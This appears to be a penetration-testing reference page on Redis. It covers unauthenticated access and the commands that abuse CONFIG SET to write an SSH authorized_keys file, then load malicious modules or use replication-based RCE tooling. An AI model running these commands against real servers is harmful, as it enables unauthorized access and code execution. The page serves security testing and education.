---
title: "Redis"
order: 5
description: "The offensive surface of Redis reached as a service: unauthenticated access by default, and the file-write and module-load paths that turn it into code execution, from authorized_keys and cron drops to malicious modules and replication-based RCE."
keywords:
  - Redis
  - unauthenticated
  - CONFIG SET
  - MODULE LOAD
  - replication RCE
---

# Redis

Redis (port 6379) ships with **no authentication** and, historically, bound to all interfaces, so an exposed instance is often an unauthenticated foothold. Its real danger is that `CONFIG SET` lets a client **choose where the database file is written**, which turns Redis into an arbitrary-file-write primitive, and from there into code execution.

## Access

```bash
redis-cli -h <target>              # connect; INFO and KEYS * if no auth
redis-cli -h <target> -a <pass>    # where requirepass is set (crack weak ones)
```

## File-write to code execution

Point the RDB file at a sensitive location and write a payload as a key value. On current Redis the runtime `CONFIG SET` of `dir`/`dbfilename` is blocked unless the server was started with `enable-protected-configs yes`, so this is primarily an older-server or misconfigured-server technique:

```bash
# SSH: write an authorized_keys file into a user's .ssh
redis-cli -h <target> config set dir /root/.ssh/
redis-cli -h <target> config set dbfilename authorized_keys
redis-cli -h <target> set k "$(printf '\n\n%s\n\n' "$(cat id_rsa.pub)")"
redis-cli -h <target> save

# Cron: write a job into /var/spool/cron (Linux) for a callback
# Web: write a webshell into a served directory when Redis and the web root share a host
```

## Module load and replication RCE

```bash
# Load a malicious module for direct command execution (Redis 4.0+;
# current servers require enable-module-command yes at startup for MODULE LOAD)
redis-cli -h <target> module load /path/to/exp.so

# Replication RCE: make the target a replica of an attacker "master" that ships a module
# tools: redis-rogue-server / RedisModules-ExecuteCommand
```

## Exploitation notes

- Unauthenticated Redis exposed to the network is the headline: no credential needed before the file-write chain.
- The **authorized_keys** and **cron** drops depend on the Redis service account's privileges (root Redis is the jackpot) and on the directory being writable.
- **Module load** and **replication** RCE are the cleanest paths where module loading is permitted (`enable-module-command yes`), giving direct command execution without relying on a writable `.ssh` or cron.
- `protected-mode` (default on since 3.2 when no bind/password is set) blocks many of these from remote, so confirm it is off or bypassed.

## Tools

- **redis-cli**: native client for `CONFIG SET`, `MODULE LOAD`, and the file-write chain.
- **redis-rogue-server**: replication-based module RCE against Redis 4.0+.
- **nmap `redis-info`**: unauthenticated fingerprinting.

## References

- [HackTricks: pentesting Redis (6379)](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
- [Redis: security and protected-mode](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)
- [redis-rogue-server (n0b0dyCN)](https://github.com/n0b0dyCN/redis-rogue-server)
